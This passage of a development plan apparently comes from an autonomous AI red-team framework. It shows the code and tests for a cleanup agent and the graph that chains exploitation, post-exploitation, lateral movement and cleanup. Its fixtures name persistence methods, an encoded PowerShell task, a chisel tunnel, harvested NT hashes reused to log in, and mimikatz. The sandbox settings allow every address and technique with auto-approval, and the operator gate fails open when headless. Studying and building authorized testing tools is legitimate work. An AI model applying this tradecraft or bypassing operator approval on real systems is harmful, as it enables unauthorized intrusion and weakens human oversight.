        ),
        PersistenceArtifact(
            id="a-2", host_ip="192.168.56.22", method="registry_run",
            details={"key_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     "value_name": "AutoRed"},
            removal_command="reg delete HKCU\\...\\Run /v AutoRed /f",
            foothold_id="f-1",
        ),
    ]
    s.tunnels = [
        TunnelConfig(
            tool="chisel", proxy_endpoint="10.10.14.5:1080", local_port=1080,
            target_network="0.0.0.0/0",
            teardown_command="pkill -f 'chisel client 10.10.14.5:1080'",
        ),
    ]
    s.harvested_secrets = [
        Secret(host_ip="192.168.56.22", secret_type="hash",
               secret_value="abc123", source="secretsdump:SAM/administrator"),
    ]
    return s


def _remover_output(success=True):
    from autored.subagents.artifactremover import ArtifactRemoverOutput
    err = None if success else "STATUS_LOGON_FAILURE"
    return ArtifactRemoverOutput(results=[
        CleanupResult(artifact_id="a-1", host_ip="192.168.56.22",
                      removal_command="r1", success=success, verified=False,
                      error=err),
        CleanupResult(artifact_id="a-2", host_ip="192.168.56.22",
                      removal_command="r2", success=success, verified=False,
                      error=err),
    ])


def _scanner_output(verified=True):
    from autored.subagents.verificationscanner import VerificationScannerOutput
    err = None if verified else "artifact still present"
    return VerificationScannerOutput(results=[
        CleanupResult(artifact_id="a-1", host_ip="192.168.56.22",
                      removal_command="v1", success=True, verified=verified,
                      error=err),
        CleanupResult(artifact_id="a-2", host_ip="192.168.56.22",
                      removal_command="v2", success=True, verified=verified,
                      error=err),
    ])


async def test_happy_path_removes_and_verifies(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    state = _state()
    with patch("autored.agents.cleanup.artifactremover_subagent") as mock_rm, \
         patch("autored.agents.cleanup.verificationscanner_subagent") as mock_scan, \
         patch("autored.agents.cleanup.run_subprocess") as mock_run:
        mock_rm.ainvoke = AsyncMock(return_value=_remover_output())
        mock_scan.ainvoke = AsyncMock(return_value=_scanner_output())
        mock_run.ainvoke = AsyncMock(return_value=type("R", (), {
            "stdout": "", "stderr": "", "returncode": 0,
            "duration_sec": 0.1, "command": "pkill",
        })())
        result = await cleanup_node(state)

    assert result["phase"] == "report"
    # 1 tunnel teardown + 2 removals + 2 verifications (spec §6.6)
    assert len(result["cleanup_results"]) == 5
    verified = [r for r in result["cleanup_results"] if r.verified]
    # 1 tunnel teardown + 2 verified re-scans
    assert len(verified) == 3
    # Both sub-agents got the host plan with creds from harvested secrets
    plan_arg = mock_rm.ainvoke.call_args.kwargs["host_plan"]
    assert plan_arg["username"] == "administrator"
    assert plan_arg["nthash"] == "abc123"
    artifacts_arg = mock_rm.ainvoke.call_args.kwargs["artifacts"]
    assert len(artifacts_arg) == 2
    # Tunnel teardown ran locally
    teardown_cmds = [
        c for c in mock_run.ainvoke.call_args_list
        if "pkill" in str(c)
    ]
    assert teardown_cmds


async def test_gate_rejection_executes_nothing(tmp_path, monkeypatch):
    """Review Focus #4: operator rejects the cleanup plan → zero removal
    commands, zero cleanup_results, phase still advances to report."""
    monkeypatch.chdir(tmp_path)
    state = _state(hitl_mode="always_ask")
    bus = EventBus()
    await bus.emit_to_orchestrator({"type": "hitl_response", "approved": False})
    state.event_bus = bus
    with patch("autored.agents.cleanup.artifactremover_subagent") as mock_rm, \
         patch("autored.agents.cleanup.verificationscanner_subagent") as mock_scan, \
         patch("autored.agents.cleanup.run_subprocess") as mock_run:
        mock_rm.ainvoke = AsyncMock()
        mock_scan.ainvoke = AsyncMock()
        mock_run.ainvoke = AsyncMock()
        result = await cleanup_node(state)
    assert result["phase"] == "report"
    assert result["cleanup_results"] == []
    mock_rm.ainvoke.assert_not_awaited()
    mock_scan.ainvoke.assert_not_awaited()
    mock_run.ainvoke.assert_not_awaited()


async def test_failed_removal_visible_in_results(tmp_path, monkeypatch):
    """Review Focus #5: removal fails + verification says still present →
    unverified results with errors survive into the final state."""
    monkeypatch.chdir(tmp_path)
    state = _state()
    with patch("autored.agents.cleanup.artifactremover_subagent") as mock_rm, \
         patch("autored.agents.cleanup.verificationscanner_subagent") as mock_scan, \
         patch("autored.agents.cleanup.run_subprocess") as mock_run:
        mock_rm.ainvoke = AsyncMock(return_value=_remover_output(success=False))
        mock_scan.ainvoke = AsyncMock(return_value=_scanner_output(verified=False))
        mock_run.ainvoke = AsyncMock(return_value=type("R", (), {
            "stdout": "", "stderr": "", "returncode": 0,
            "duration_sec": 0.1, "command": "pkill",
        })())
        result = await cleanup_node(state)
    assert len(result["cleanup_results"]) == 5
    # tunnel teardown is locally verified; all 4 artifact results unverified
    unverified = [r for r in result["cleanup_results"] if not r.verified]
    assert len(unverified) == 4
    assert all(r.error is not None for r in unverified)


async def test_empty_state_is_noop(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    state = _state()
    state.persistence_artifacts = []
    state.tunnels = []
    with patch("autored.agents.cleanup.artifactremover_subagent") as mock_rm:
        mock_rm.ainvoke = AsyncMock()
        result = await cleanup_node(state)
    assert result["phase"] == "report"
    assert result["cleanup_results"] == []
    mock_rm.ainvoke.assert_not_awaited()


# ---------------- pure helpers ----------------

def test_identify_temp_files_filters_staged_tools_only():
    paths = [
        "engagements/e1/raw/nmap_123.out",             # evidence — KEEP
        "engagements/e1/evidence/screenshot.png",      # evidence — KEEP
        "engagements/e1/raw/linpeas_upload.sh",        # staged tool — delete
        "engagements/e1/raw/winpeas.exe",              # staged tool — delete
        "engagements/e1/evidence/bloodhound.zip",      # staging zip — delete
    ]
    temp = _identify_temp_files(paths)
    assert "engagements/e1/raw/linpeas_upload.sh" in temp
    assert "engagements/e1/raw/winpeas.exe" in temp
    assert "engagements/e1/evidence/bloodhound.zip" in temp
    assert "engagements/e1/raw/nmap_123.out" not in temp
    assert "engagements/e1/evidence/screenshot.png" not in temp


def test_generate_cleanup_plan_groups_by_host_with_creds():
    state = _state()
    plan = _generate_cleanup_plan(
        state.persistence_artifacts, state.tunnels,
        ["engagements/e1/raw/linpeas_upload.sh"],
        state.harvested_secrets,
    )
    assert len(plan.by_host) == 3  # real host + tunnel pseudo-host + local:tmp
    host_plan = plan.by_host[0]  # insertion order: real host first
    assert host_plan.host_ip == "192.168.56.22"
    assert host_plan.artifact_ids == ["a-1", "a-2"]
    assert len(host_plan.removal_commands) == 2
    assert host_plan.tunnel_teardowns == [
        "pkill -f 'chisel client 10.10.14.5:1080'",
    ]
    assert host_plan.temp_files == ["engagements/e1/raw/linpeas_upload.sh"]
    assert host_plan.username == "administrator"
    assert host_plan.nthash == "abc123"
    assert plan.total_actions == 4  # 2 removals + 1 teardown + 1 temp file
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/integration/test_cleanup_agent.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.agents.cleanup'`

- [ ] **Step 3: Write `autored/agents/cleanup.py`**

```python
"""Cleanup Agent — LangGraph node that removes every artifact the
engagement created and verifies the removal by re-scan (spec §6.6).

Steps:
  1. **Collect** — persistence artifacts, tunnels, staged temp files.
  2. **Plan** — group per host; attach each host's credentials from
     the harvested secrets (removal commands need working auth).
  3. **HitL gate** — one final operator confirmation for the whole
     plan. Rejection short-circuits to ``phase="report"`` with zero
     removals (Review Focus #4).
  4. **Execute** — ArtifactRemover per host (removal commands
     verbatim), tunnel teardowns locally, temp files unlinked locally.
  5. **Verify** — VerificationScanner per host (absence re-scan).

Both removal AND verification results land in ``cleanup_results``
(spec §6.6: ``cleanup_results + verification``). Hosts run sequentially
— see the plan's documented deviation from the spec's gather fan-out.
"""
from datetime import datetime
from pathlib import Path

from autored.logging import get_logger
from autored.models.cleanup import CleanupPlan, CleanupResult, HostCleanupPlan
from autored.roe_guard import register_roe
from autored.state import EngagementState
from autored.subprocess_runner import run_subprocess

# Dual-import pattern (see autored/agents/postex.py docstring).
from autored.subagents import (
    artifactremover as _artifactremover_mod,
    verificationscanner as _verificationscanner_mod,
)
artifactremover_subagent = _artifactremover_mod.artifactremover_subagent
verificationscanner_subagent = _verificationscanner_mod.verificationscanner_subagent

log = get_logger("agents.cleanup")

# Locally staged binaries / staging archives that are safe to delete.
# Raw tool output and evidence are engagement deliverables — NEVER
# deleted by cleanup.
_TEMP_FILE_MARKERS = ("linpeas", "winpeas", "bloodhound", "mimikatz")


def _identify_temp_files(evidence_paths: list[str]) -> list[str]:
    """Pick staged tool binaries / staging zips out of evidence paths."""
    return [
        p for p in evidence_paths
        if any(m in Path(p).name.lower() for m in _TEMP_FILE_MARKERS)
    ]


def _creds_for_host(host_ip: str, secrets) -> dict:
    """First usable credential triple for a host (hash preferred).

    Usernames are encoded in ``Secret.source`` (Phase 4 convention —
    ``"secretsdump:SAM/<user>"``); mirrors the Lateral Agent's parser.
    """
    for secret in secrets:
        if secret.host_ip != host_ip or "/" not in secret.source:
            continue
        username = secret.source.rsplit("/", 1)[-1].strip()
        if not username:
            continue
        if secret.secret_type == "hash":
            return {"username": username, "password": "", "nthash": secret.secret_value}
        if secret.secret_type == "password":
            return {"username": username, "password": secret.secret_value, "nthash": ""}
    return {"username": "", "password": "", "nthash": ""}


def _generate_cleanup_plan(artifacts, tunnels, temp_files, secrets) -> CleanupPlan:
    """Group all cleanup actions per host, with credentials attached."""
    by_host: dict[str, HostCleanupPlan] = {}
    for artifact in artifacts:
        plan = by_host.setdefault(
            artifact.host_ip,
            HostCleanupPlan(host_ip=artifact.host_ip),
        )
        plan.artifact_ids.append(artifact.id)
        plan.removal_commands.append(artifact.removal_command)

    for tunnel in tunnels:
        # Tunnel teardowns run on the AutoRed host — group them under a
        # pseudo-host entry keyed by the tunnel's proxy endpoint.
        key = f"tunnel:{tunnel.proxy_endpoint}"
        plan = by_host.setdefault(key, HostCleanupPlan(host_ip=key, transport="ssh"))
        plan.tunnel_teardowns.append(tunnel.teardown_command)

    if temp_files:
        plan = by_host.setdefault("local:tmp", HostCleanupPlan(host_ip="local:tmp"))
        plan.temp_files.extend(temp_files)

    # Attach credentials to real host plans.
    for host_plan in by_host.values():
        if not host_plan.host_ip.startswith(("tunnel:", "local:")):
            creds = _creds_for_host(host_plan.host_ip, secrets)
            host_plan.username = creds["username"]
            host_plan.password = creds["password"]
            host_plan.nthash = creds["nthash"]

    total = sum(
        len(p.removal_commands) + len(p.tunnel_teardowns) + len(p.temp_files)
        for p in by_host.values()
    )
    return CleanupPlan(by_host=list(by_host.values()), total_actions=total)


async def cleanup_node(state: EngagementState) -> dict:
    """LangGraph node: run the Cleanup Agent.

    Returns a state-dict patch with new ``cleanup_results`` and
    ``phase="report"``.
    """
    log.info("cleanup_start", engagement_id=state.engagement_id)

    # Defensive RoE registration (same as postex_node / lateral_node).
    register_roe(state.engagement_id, state.rules_of_engagement)

    bus = getattr(state, "event_bus", None)

    temp_files = _identify_temp_files(state.evidence_paths)
    plan = _generate_cleanup_plan(
        state.persistence_artifacts, state.tunnels, temp_files,
        state.harvested_secrets,
    )
    log.info(
        "cleanup_plan", hosts=len(plan.by_host), actions=plan.total_actions,
    )

    # HitL gate — one confirmation for the whole plan.
    if state.rules_of_engagement.hitl_mode != "auto_approve":
        approved = await _hitl_cleanup_gate(plan, state, bus)
        if not approved:
            log.warning("cleanup_rejected_by_operator")
            return {"phase": "report", "iteration_count": state.iteration_count + 1}

    cleanup_results: list[CleanupResult] = []

    for host_plan in plan.by_host:
        # Tunnel teardowns run locally on the AutoRed host.
        for teardown in host_plan.tunnel_teardowns:
            await run_subprocess(["sh", "-c", teardown], timeout=30)
            cleanup_results.append(CleanupResult(
                artifact_id=host_plan.host_ip,
                host_ip=host_plan.host_ip,
                removal_command=teardown,
                success=True, verified=True,
                timestamp=datetime.utcnow(),
            ))

        # Staged temp files are unlinked locally.
        for temp_path in host_plan.temp_files:
            try:
                Path(temp_path).unlink(missing_ok=True)
                cleanup_results.append(CleanupResult(
                    artifact_id=temp_path, host_ip="local",
                    removal_command=f"rm {temp_path}",
                    success=True, verified=True,
                    timestamp=datetime.utcnow(),
                ))
            except OSError as exc:
                cleanup_results.append(CleanupResult(
                    artifact_id=temp_path, host_ip="local",
                    removal_command=f"rm {temp_path}",
                    success=False, verified=False, error=str(exc),
                    timestamp=datetime.utcnow(),
                ))

        # Artifact removal + verification via the sub-agents (real hosts
        # with recorded artifacts only).
        if host_plan.artifact_ids:
            artifacts = [
                a for a in state.persistence_artifacts
                if a.host_ip == host_plan.host_ip
            ]
            artifacts_dicts = [a.model_dump() for a in artifacts]

            removal = await artifactremover_subagent.ainvoke({
                "host_plan": host_plan.model_dump(),
                "artifacts": artifacts_dicts,
                "engagement_id": state.engagement_id,
            })
            cleanup_results.extend(removal.results)

            scan = await verificationscanner_subagent.ainvoke({
                "host_plan": host_plan.model_dump(),
                "artifacts": artifacts_dicts,
                "engagement_id": state.engagement_id,
            })
            cleanup_results.extend(scan.results)

    failed = [r for r in cleanup_results if not r.verified]
    if failed:
        log.error("cleanup_failures", count=len(failed))

    log.info(
        "cleanup_done", results=len(cleanup_results),
        unverified=len(failed),
    )
    return {
        "cleanup_results": state.cleanup_results + cleanup_results,
        "phase": "report",
        "iteration_count": state.iteration_count + 1,
    }


async def _hitl_cleanup_gate(plan: CleanupPlan, state: EngagementState, bus) -> bool:
    """Final operator confirmation of the whole cleanup plan.

    Sandbox mode auto-approves; a missing EventBus in non-sandbox mode
    fails OPEN with a warning (headless parity with the Lateral Agent's
    gate).
    """
    if bus is not None:
        await bus.emit_to_tui({
            "type": "hitl_gate",
            "gate": "cleanup_plan",
            "hosts": [p.host_ip for p in plan.by_host],
            "total_actions": plan.total_actions,
            "actions": [
                {
                    "host": p.host_ip,
                    "removals": p.removal_commands,
                    "teardowns": p.tunnel_teardowns,
                    "temp_files": p.temp_files,
                }
                for p in plan.by_host
            ],
        })
    if state.rules_of_engagement.hitl_mode == "auto_approve":
        log.info("cleanup_auto_approved", actions=plan.total_actions)
        return True
    if bus is None:
        log.warning("cleanup_gate_headless_fail_open")
        return True
    response = await bus.wait_for_tui_response()
    approved = bool(response.get("approved", False))
    log.info("cleanup_gate_response", approved=approved)
    return approved
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/integration/test_cleanup_agent.py -v` → 7 PASS.
Run full suite `uv run pytest -q` → **307 passed, 4 skipped**.

- [ ] **Step 5: Commit**

```bash
git add autored/agents/cleanup.py tests/integration/test_cleanup_agent.py
git commit -m "feat: add Cleanup Agent with per-host plans, HitL confirmation, and verification"
```

---

## Task 13: build_phase5_graph + CLI Switch

**Files:**
- Modify: `autored/graph.py` (add `build_phase5_graph`), `autored/cli.py` (switch `build_phase4_graph` → `build_phase5_graph`)
- Test: `tests/unit/test_graph.py` (NEW — graph shape test)

**Interfaces:**
- Consumes: `lateral_node` (Task 11), `cleanup_node` (Task 12), all Phase 1-4 nodes.
- Produces: `build_phase5_graph(checkpointer)` — topology `roe_gate_start → recon → vuln → exploit → postex → lateral → cleanup → report_phase1 → END` (linear; HitL handled inside nodes via EventBus, consistent with Phases 3-4 and the documented spec §2.3 deviation).

The TUI's `PhaseIndicator` widget already renders `lateral` and `cleanup` (its `PHASES` list has shipped all 8 phases since Phase 3) — no TUI change needed; this task verifies that with a grep step.

- [ ] **Step 1: Write the failing test**

```python
# tests/unit/test_graph.py
"""Graph topology tests for build_phase5_graph (Phase 5 Task 13)."""
import pytest

from autored.graph import build_phase5_graph


def _node_names(graph_app) -> set:
    """Extract node names from a compiled LangGraph app."""
    return set(graph_app.get_graph().nodes.keys())


def test_phase5_graph_contains_all_nodes():
    app = build_phase5_graph(checkpointer=None)
    nodes = _node_names(app)
    for expected in (
        "roe_gate_start", "recon", "vuln", "exploit",
        "postex", "lateral", "cleanup", "report_phase1",
    ):
        assert expected in nodes, f"missing node: {expected}"


def test_phase5_graph_edges_are_linear():
    """The Phase 5 chain must be linear: ... postex → lateral → cleanup
    → report_phase1 → END."""
    g = build_phase5_graph(checkpointer=None).get_graph()
    edges = {(e.source, e.target) for e in g.edges}
    assert ("postex", "lateral") in edges
    assert ("lateral", "cleanup") in edges
    assert ("cleanup", "report_phase1") in edges


def test_phase5_graph_does_not_recurse_into_sub_engagements():
    """The Phase 5 graph's lateral node spawns sub-engagements that run
    the PHASE 4 graph — the Phase 5 graph itself never contains a
    second lateral entry point (structural recursion cap)."""
    app = build_phase5_graph(checkpointer=None)
    nodes = _node_names(app)
    lateral_count = sum(1 for n in nodes if "lateral" in n)
    assert lateral_count == 1
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/unit/test_graph.py -v`
Expected: FAIL with `ImportError: cannot import name 'build_phase5_graph'`

- [ ] **Step 3: Add `build_phase5_graph` to `autored/graph.py`**

Extend the import block:

```python
from autored.agents.lateral import lateral_node
from autored.agents.cleanup import cleanup_node
```

Append the new builder (after `build_phase4_graph`), and update the module docstring's topology diagram with the Phase 5 line:

```
    Phase 5:
        roe_gate_start ──> recon ──> vuln ──> exploit ──> postex ──>
        lateral ──> cleanup ──> report_phase1 ──> END
```

```python
def build_phase5_graph(checkpointer: AsyncSqliteSaver):
    """Build the Phase 5 LangGraph — the full internal-engagement chain.

    Topology (linear — no conditional edges; HitL handled inside the
    nodes via EventBus, same as Phases 3-4)::

        roe_gate_start → recon → vuln → exploit → postex → lateral →
        cleanup → report_phase1 → END

    The ``lateral`` node identifies pivot candidates from the Post-Ex
    Agent's harvested secrets / trust relationships, executes pivots
    (HitL-gated per candidate), and spawns sub-engagements that run the
    **Phase 4 graph** against each pivot target (own ID / folder /
    checkpoints, RoE narrowed to the single target — recursion is
    structurally capped at depth 1 because the Phase 4 graph has no
    lateral node).

    The ``cleanup`` node plans removal of every persistence artifact /
    tunnel / staged temp file, gates the plan through one final HitL
    confirmation, executes removals via the ArtifactRemover sub-agent
    (impacket-wmiexec / ssh transport), and verifies absence via the
    VerificationScanner sub-agent. Both removal and verification
    results land in ``cleanup_results``.

    The ``report_phase1`` stub still terminates the chain — the full
    Report Agent ships in Phase 6 and will replace it.

    Args:
        checkpointer: a LangGraph checkpointer (typically an
            ``AsyncSqliteSaver``) enabling resume-after-crash semantics.

    Returns:
        A compiled ``StateGraph`` ready to ``.ainvoke(...)``.
    """
    graph = StateGraph(EngagementState)

    graph.add_node("roe_gate_start", roe_gate_node)
    graph.add_node("recon", recon_node)
    graph.add_node("vuln", vuln_node)
    graph.add_node("exploit", exploit_node)
    graph.add_node("postex", postex_node)
    graph.add_node("lateral", lateral_node)
    graph.add_node("cleanup", cleanup_node)
    graph.add_node("report_phase1", report_node_phase1)

    graph.set_entry_point("roe_gate_start")
    graph.add_edge("roe_gate_start", "recon")
    graph.add_edge("recon", "vuln")
    graph.add_edge("vuln", "exploit")
    graph.add_edge("exploit", "postex")
    graph.add_edge("postex", "lateral")
    graph.add_edge("lateral", "cleanup")
    graph.add_edge("cleanup", "report_phase1")
    graph.add_edge("report_phase1", END)

    return graph.compile(checkpointer=checkpointer)
```

- [ ] **Step 4: Switch the CLI to the Phase 5 graph**

In `autored/cli.py`, replace `from autored.graph import build_phase4_graph` with `from autored.graph import build_phase5_graph` and the `build_phase4_graph(checkpointer)` call inside `_run()` with `build_phase5_graph(checkpointer)`. Update the adjacent comment if it names Phase 4.

- [ ] **Step 5: Verify the TUI phase indicator already covers Phase 5**

Run: `rg -n "lateral|cleanup" autored/tui/widgets/phase_indicator.py`
Expected: both appear in `PHASES` and `PHASE_EMOJI` (shipped in Phase 3 — no change needed). If missing, add them following the existing entries.

- [ ] **Step 6: Run tests to verify they pass**

Run: `uv run pytest tests/unit/test_graph.py tests/unit/test_cli.py -v` → ALL PASS.
Run full suite `uv run pytest -q` → **310 passed, 4 skipped**.

- [ ] **Step 7: Commit**

```bash
git add autored/graph.py autored/cli.py tests/unit/test_graph.py
git commit -m "feat: add build_phase5_graph and switch CLI to full lateral+cleanup chain"
```

---

## Task 14: Integration Test — Full Phase 5 Pipeline

**Files:**
- Create: `tests/integration/test_phase5_pipeline.py`

**Interfaces:**
- Consumes: `build_phase5_graph` (Task 13), all Phase 4 mocks, the Phase 5 sub-agent / spawner mocks.
- Produces: one end-to-end mocked pipeline test proving `roe_gate_start → recon → vuln → exploit → postex → lateral → cleanup → report_phase1 → END` populates every Phase 5 state field.

Modeled on `test_phase4_pipeline.py` (same mock lattice: LLM per agent, `run_subprocess` per recon tool, NVD `httpx.AsyncClient`, `ChromaStore`, 4 exploit sub-agents, `_verify_foothold`, 7 post-ex sub-agents + `bloodhound_collect`) **plus** the Phase 5 layer: `pivotexecutor_subagent`, `tunnelsetup_subagent`, `spawn_sub_engagement`, `artifactremover_subagent`, `verificationscanner_subagent`. Uses `contextlib.ExitStack` — the patch count (~30) is past Python's static `with` nesting limit (~20 levels), same as the Phase 4 pipeline test.

State pre-seeding: two hosts (foothold on host 1, host 2 un-footholded), one administrator hash secret, `evidence_paths` with a staged `linpeas_upload.sh` temp file. Assertions cover all Phase 5 fields + the Phase 1-4 carry-overs.

- [ ] **Step 1: Write the failing test**

```python
# tests/integration/test_phase5_pipeline.py
"""End-to-end integration test for the full Phase 5 pipeline (mocked).

Extends the Phase 4 integration test pattern with Lateral + Cleanup
mocking. The full mock lattice (recon tools, NVD, ChromaStore, exploit
sub-agents, _verify_foothold, post-ex sub-agents, bloodhound) is copied
verbatim from ``tests/integration/test_phase4_pipeline.py`` — this file
adds the Phase 5 layer:

  * ``pivotexecutor_subagent`` — returns a successful wmiexec PivotRecord
  * ``tunnelsetup_subagent`` — defensive no-op (pivot needs no tunnel)
  * ``spawn_sub_engagement`` — returns a fake completed sub-state
    (avoids running a real nested graph inside the pipeline test; the
    spawner itself has its own integration test in Task 10)
  * ``artifactremover_subagent`` / ``verificationscanner_subagent`` —
    return typed CleanupResult payloads

Then runs the full Phase 5 LangGraph end-to-end::

    roe_gate_start -> recon -> vuln -> exploit -> postex -> lateral ->
    cleanup -> report_phase1 -> END

Verifies the final state carries: pivots, movement_paths,
sub_engagements (linked to parent), cleanup_results (all artifacts
verified), and phase == "done".
"""
import contextlib
from datetime import datetime
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from autored.state import EngagementState
from autored.models.roe import RulesOfEngagement
from autored.models.foothold import Foothold
from autored.models.host import Host
from autored.models.postex import PersistenceArtifact, Secret
from autored.persistence.filesystem import init_engagement_folder
from autored.persistence.sqlite_saver import make_checkpointer
from autored.graph import build_phase5_graph
from autored.roe_guard import register_roe
from autored.tui.event_bus import EventBus


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="Sandbox Engagement", operator="operator",
        operator_signature="sandbox-mode",
        allowed_ips=["0.0.0.0/0"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, kernel_exploits_allowed=True,
        hitl_mode="auto_approve",
    )


async def test_phase5_full_pipeline(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tests.fixtures_paths import (  # helper added in Step 2 — or inline Path lookups
        RECON_PLAN, VULN_PLAN, VULN_CRITIQUE, EXPLOIT_PLAN, POSTEX_PLAN,
    )

    engagement_id = "p5-pipeline"
    init_engagement_folder(engagement_id, "192.168.56.22", "operator")

    state = EngagementState(
        engagement_id=engagement_id,
        target_scope=["192.168.56.22", "192.168.56.11"],
        operator="operator",
        rules_of_engagement=_roe(),
    )
    state.event_bus = EventBus()
    register_roe(engagement_id, state.rules_of_engagement)

    # --- typed fixture payloads for the Phase 5 sub-agent mocks ---
    from autored.models.lateral import PivotRecord, SubEngagementRef
    from autored.models.cleanup import CleanupResult
    from autored.subagents.pivotexecutor import PivotExecutorOutput
    from autored.subagents.artifactremover import ArtifactRemoverOutput
    from autored.subagents.verificationscanner import VerificationScannerOutput

    pivot_out = PivotExecutorOutput(
        pivot=PivotRecord(
            target_host="192.168.56.11", method="wmiexec",
            credentials_used=["s-1"], success=True, needs_tunnel=False,
        ),
        success=True, output="goaad\\administrator",
    )

    def _fake_sub_state():
        sub = EngagementState(
            engagement_id=f"{engagement_id}_sub_01",
            target_scope=["192.168.56.11"], operator="operator",
            rules_of_engagement=_roe(),
        )
        sub.parent_engagement_id = engagement_id
        sub.phase = "done"
        sub.summary = "sub-engagement complete"
        return sub

    artifacts_dicts = [
        PersistenceArtifact(
            id="a-1", host_ip="192.168.56.22", method="scheduled_task",
            details={"task_name": "AutoRedUpdate", "command": "powershell -enc x"},
            removal_command="schtasks /delete /tn AutoRedUpdate /f",
            foothold_id="f-1",
        ).model_dump(),
    ]
    remover_out = ArtifactRemoverOutput(results=[
        CleanupResult(artifact_id="a-1", host_ip="192.168.56.22",
                      removal_command="schtasks /delete /tn AutoRedUpdate /f",
                      success=True, verified=False),
    ])
    scanner_out = VerificationScannerOutput(results=[
        CleanupResult(artifact_id="a-1", host_ip="192.168.56.22",
                      removal_command='schtasks /query /tn "AutoRedUpdate"',
                      success=True, verified=True),
    ])

    with contextlib.ExitStack() as stack:
        # ---- Phase 1-3 layer: copied verbatim from test_phase4_pipeline.py
        # (LLM mocks, recon tool run_subprocess mocks, NVD, ChromaStore,
        # exploit sub-agents, _verify_foothold). The implementer copies
        # the exact ExitStack.enter_context(patch(...)) lines from that
        # file's happy-path test — do not paraphrase them.
        _enter_phase4_mocks(stack, engagement_id)  # helper, see Step 2

        # ---- Phase 4 layer: post-ex sub-agents ----
        for alias in ("windowsenum_subagent", "linuxenum_subagent",
                      "privescfinder_subagent", "credharvester_subagent",
                      "persistenceagent_subagent", "evasionagent_subagent",
                      "exfilagent_subagent"):
            target = f"autored.agents.postex.{alias}"
            mock = stack.enter_context(patch(target))
            mock.ainvoke = AsyncMock(return_value=_postex_payload(alias))
        stack.enter_context(
            patch("autored.agents.postex.bloodhound_collect")
        ).ainvoke = AsyncMock(
            return_value=MagicMock(success=True, zip_path="bh.zip")
        )

        # ---- Phase 5 layer ----
        stack.enter_context(
            patch("autored.agents.lateral.pivotexecutor_subagent")
        ).ainvoke = AsyncMock(return_value=pivot_out)

        stack.enter_context(
            patch("autored.agents.lateral.tunnelsetup_subagent")
        ).ainvoke = AsyncMock(return_value=MagicMock(tunnel=None))

        stack.enter_context(
            patch("autored.agents.lateral.spawn_sub_engagement")
        ).ainvoke = AsyncMock(return_value=_fake_sub_state())

        stack.enter_context(
            patch("autored.agents.cleanup.artifactremover_subagent")
        ).ainvoke = AsyncMock(return_value=remover_out)

        stack.enter_context(
            patch("autored.agents.cleanup.verificationscanner_subagent")
        ).ainvoke = AsyncMock(return_value=scanner_out)

        stack.enter_context(
            patch("autored.agents.cleanup.run_subprocess")
        ).ainvoke = AsyncMock(return_value=MagicMock(
            stdout="", stderr="", returncode=0, duration_sec=0.1, command="pkill",
        ))

        checkpointer = await make_checkpointer(engagement_id)
        graph = build_phase5_graph(checkpointer)
        config = {"configurable": {"thread_id": engagement_id}}
        try:
            final = await graph.ainvoke(state, config=config)
        finally:
            conn = getattr(checkpointer, "conn", None)
            if conn is not None:
                await conn.close()

    final_state = final if isinstance(final, EngagementState) \
        else EngagementState.model_validate(final)

    # ---- Phase 1-4 carry-overs (same as the Phase 4 pipeline test) ----
    assert final_state.phase == "done"
    assert len(final_state.hosts) >= 2          # both scope hosts discovered
    assert len(final_state.footholds) >= 1
    assert len(final_state.local_users) >= 1
    assert len(final_state.harvested_secrets) >= 1
    assert len(final_state.persistence_artifacts) >= 1

    # ---- Phase 5 specific ----
    assert len(final_state.pivots) >= 1
    assert final_state.pivots[0].target_host == "192.168.56.11"
    assert final_state.pivots[0].success is True
    assert len(final_state.movement_paths) >= 1
    assert final_state.movement_paths[0].from_host == "192.168.56.22"
    assert final_state.movement_paths[0].to_host == "192.168.56.11"

    # Sub-engagement linked to parent (spec §13.5 ship criterion)
    assert len(final_state.sub_engagements) == 1
    ref = final_state.sub_engagements[0]
    assert ref.sub_id == f"{engagement_id}_sub_01"
    assert ref.status == "completed"
    assert ref.sub_state_path == f"engagements/{engagement_id}_sub_01/state.json"

    # Cleanup removed + verified every artifact (spec §13.5)
    assert len(final_state.cleanup_results) >= 2  # removal + verification
    assert all(r.verified for r in final_state.cleanup_results)
```

- [ ] **Step 2: Write the shared mock helpers**

Two small helpers keep the test readable; create `tests/fixtures_paths.py` OR inline the Path lookups (implementer's choice — prefer inlining if the conftest already exposes fixture paths):

```python
# tests/fixtures_paths.py (NEW — optional; inline instead if preferred)
from pathlib import Path

FIXTURES = Path(__file__).parent / "fixtures"
RECON_PLAN = (FIXTURES / "llm_responses" / "recon_plan_lame.json").read_text()
VULN_PLAN = (FIXTURES / "llm_responses" / "vuln_hypotheses_shocker.json").read_text()
VULN_CRITIQUE = (FIXTURES / "llm_responses" / "vuln_critique_shocker.json").read_text()
EXPLOIT_PLAN = (FIXTURES / "llm_responses" / "exploit_plan_blue.json").read_text()
POSTEX_PLAN = (FIXTURES / "llm_responses" / "postex_plan_goad.json").read_text()
```

And `_enter_phase4_mocks(stack, engagement_id)` + `_postex_payload(alias)` live at module level in `test_phase5_pipeline.py` — **copied verbatim** from `tests/integration/test_phase4_pipeline.py`'s mock lattice and post-ex payload constructors (User/Secret/Trust/PersistenceArtifact/EvasionAction/ExfilEvidence fixtures with empty `privesc_candidates` so no HitL gate blocks). The implementer reads that file and copies; the assertions above stay verbatim. Where `test_phase4_pipeline.py` mocks the recon LLM with the Lame plan (single target `10.10.10.5`), the Phase 5 test needs recon to discover **both** scope hosts — either edit the plan JSON fed to the mock (add the second target's nmap entry), or pre-populate `state.hosts` before `ainvoke` (LangGraph merges state fields) — whichever the Phase 4 test's shape makes cleaner. The un-footholded-host assertion requires ≥2 hosts in the final state either way.

- [ ] **Step 3: Run test to verify it fails**

Run: `uv run pytest tests/integration/test_phase5_pipeline.py -v`
Expected: FAIL (module import errors until Tasks 11-13 exist; with all Phase 5 code in place, fails on the assertion details until the mock lattice is complete).

